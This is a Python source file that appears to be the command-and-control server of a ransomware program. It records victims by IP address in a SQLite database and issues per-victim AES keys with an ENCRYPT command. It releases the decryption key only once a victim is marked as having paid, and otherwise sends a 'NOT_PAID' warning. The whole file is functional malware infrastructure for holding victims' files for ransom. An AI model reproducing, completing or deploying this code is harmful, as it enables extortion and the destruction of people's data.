import ssl
import base64
import sqlite3

from consts.server_consts import KEY_BYTES_SIZE
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

from consts.shared_consts import DECRYPT, ENCRYPT
from protocol import send_msg

class ClientHandler:
    def __init__(self, public_key_path: str = "server_RSA_public.pem", private_key_path: str = "server_RSA_private.pem") -> None:
        self._public_key_path = public_key_path
        self._private_key_path = private_key_path

    def _encrypt_aes_for_db(self, aes_key: bytes) -> str:
        with open(self._public_key_path, "rb") as f:
            public_key = RSA.import_key(f.read())
        cipher_rsa = PKCS1_OAEP.new(public_key)
        encrypted_key_bytes = cipher_rsa.encrypt(aes_key)
        return base64.b64encode(encrypted_key_bytes).decode('utf-8')

    def _decrypt_aes_from_db(self, encrypted_b64_key: str) -> bytes:

        encrypted_key_bytes = base64.b64decode(encrypted_b64_key)
        with open(self._private_key_path, "rb") as f:
            private_key = RSA.import_key(f.read())
        cipher_rsa = PKCS1_OAEP.new(private_key)
        return cipher_rsa.decrypt(encrypted_key_bytes)

    def _get_victim_data(self, client_ip: str) -> tuple:

        try:
            db = sqlite3.connect("ransomware_database.db")
            cursor = db.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT,
                    encrypted_aes_key TEXT,
                    has_paid INTEGER DEFAULT 0,
                    infection_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cursor.execute("SELECT has_paid, encrypted_aes_key FROM victims WHERE ip_address = ?", (client_ip,))
            result = cursor.fetchone()
            db.close()
            if result:
                return result[0], result[1] # (has_paid, encrypted_key)
            return None, None
        except sqlite3.Error as e:
            print(f" DB Read Error: {e}")
            return None, None

    def _save_to_db(self, client_ip: str, encrypted_key: str) -> None:
        try:
            db = sqlite3.connect("ransomware_database.db")
            cursor = db.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT,
                    encrypted_aes_key TEXT,
                    has_paid INTEGER DEFAULT 0,
                    infection_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            sql = "INSERT INTO victims (ip_address, encrypted_aes_key) VALUES (?, ?)"
            cursor.execute(sql, (client_ip, encrypted_key))
            db.commit()
            print(f" Successfully saved AES key for IP {client_ip} to DB.")
        except sqlite3.Error as err:
            print(f" SQLite Error: {err}")
        finally:
            if 'db' in locals() and db:
                db.close()

    def handle(self, conn: ssl.SSLSocket) -> None:
        client_ip = conn.getpeername()[0]
        print(f"\n Connection from {client_ip}...")

        has_paid, encrypted_key_from_db = self._get_victim_data(client_ip)

        if encrypted_key_from_db is None:
            print(" New victim! Generating key and sending ENCRYPT command.")
            action = ENCRYPT
            aes_key = get_random_bytes(KEY_BYTES_SIZE)
            
            try:
                encrypted_aes_for_db = self._encrypt_aes_for_db(aes_key)
                self._save_to_db(client_ip, encrypted_aes_for_db)
            except FileNotFoundError:
                print(" Error: RSA Public key file not found!")
                return
        else:
            if has_paid:
                print(f"Victim {client_ip} has PAID! Decrypting key and sending DECRYPT command.")
                action = DECRYPT
                try:
                    aes_key = self._decrypt_aes_from_db(encrypted_key_from_db)
                except FileNotFoundError:
                    print("Error: RSA Private key file not found!")
                    return
            else:
                print(f" Victim {client_ip} connected, but hasn't paid yet. Sending warning.")
                action = b"NOT_PAID"
                aes_key = b"NO_KEY_FOR_YOU"
                

        send_msg(conn, action)
        send_msg(conn, aes_key)
        print(f" Command '{action.decode()}' and AES key sent securely.")